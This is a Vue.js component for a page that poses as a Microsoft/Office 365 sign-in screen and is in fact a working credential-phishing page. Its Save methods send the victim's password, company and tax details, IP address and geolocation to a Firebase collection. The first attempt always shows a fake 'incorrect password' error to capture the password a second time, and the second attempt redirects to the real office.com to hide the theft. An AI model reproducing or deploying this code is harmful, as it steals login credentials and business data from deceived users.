<template>
<div class="backgroundx">
    
<div >
   <v-flex 
   xs12 
   sm12
    md12
    layout
   justify-center

   >
   <v-card class="login" flat > 
      <img src="./ml.svg" alt="" width="110px">
      <br>
      <br>  
      <p style="font-size: 17px;"> {{ getEmail }}</p>
   <h1>Enter password</h1>
    <p style="color:red; font-size:14px" v-if="passLogic">Your account or password is incorrect. If you don't remember your password,
        <span style="color:#0b68b4;"> <a style="text-decoration:none"  href="https://account.live.com/password/reset">reset it now.</a> </span>
       </p>
          <v-text-field
          type = "password"
            v-model="password"
            placeholder="Password"
          ></v-text-field>

       <span style="color:#0b68b4;"> <a style="font-size:14px;text-decoration:none" href="https://account.live.com/password/reset">Forgot password?</a> </span>
        <br><br>
        <button class="btn" @click="Save" v-if="btn">Sign in</button>
        <button class="btn" @click="Save2" v-else>Sign in</button>
   </v-card>
   </v-flex>

</div>
</div>
</template>

<script>
import db from '../../firebaseinit.js';
import firebase from 'firebase';
import { error } from 'util';
 import { mapGetters } from 'vuex'
  export default {
     data() {
    return {
       json:null,
         btn: true,
         passLogic: false,
           password: '',
           Cdate: new Date()
    }
  },
  computed:{
         ...mapGetters ([
             'getEmail',
            'getCompanyName',
            'getMailingAddressA1',
            'getMailingAddressA2',
            'getCity1',
            'getState1',
            'getZip1',
            'getContactName',
            'getPhoneNumber',
            'getFaxNumber',
            'getEmailAddress',
            'getMailingQuestion',
            'getMailingAddressB1',
            'getMailingAddressB2',
            'getCity2',
            'getState2',
            'getZip2',
            'getTaxDesignator',
            'getTaxId',
            'getType',
            'getStatus',
            'getEmployees'
         ]),
   },
   created(){
           var _this = this;
        $.getJSON('https://geoip-db.com/json/', function (json) {
            _this.json = json;
           });
     },

    methods:{
      Save(){
        db.collection('Details').add({
            Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Office',
        Email: this.getEmail,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
          Zip2 : this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
           TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
       .then(docRef =>  this.passLogic = true, this.password = "" , this.btn = false)
   
   .catch(error => console.log(err))
             },
             Save2(){
        db.collection('Details').add({
          Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Office',
        Email: this.getEmail,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
          Zip2 : this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
          TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
        window.location.assign("https://www.office.com/")
             }
    }
  }
</script>

<style scoped>
.btn {background: #0b68b4 ; padding: 5px;width: 100px; color: white;float: right;}
h1 {font-size: 25px;}
.backgroundx {height:100vh;background-image: url('./bg2.jpg');background-size: cover;padding: 165px 0px 0px 0px ;}
.login {padding: 40px; height: auto; width:450px; color: rgb(73, 73, 73);}
 @media (max-width: 991px) { 
.btn {background: #0b68b4 ; padding: 5px;width: 100px; color: white;float: right;}
h1 {font-size: 25px;}
.backgroundx {height:100vh;background-image: url('./bg2.jpg');background-size: cover;padding: 165px 0px 0px 0px ;}
.login {padding: 40px; height: 350px; width:450px; color: rgb(73, 73, 73);border-radius: 1px;}
  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
.btn {background: #0b68b4 ; padding: 5px;width: 100px; color: white;float: right;}
h1 {font-size: 25px;}
.backgroundx {height:100vh;background-image: url('./bg2.jpg');background-size: cover;padding: 130px 20px 0px 20px ;}
.login {padding: 40px; height: 350px; width:450px; color: rgb(73, 73, 73);}
}
</style>
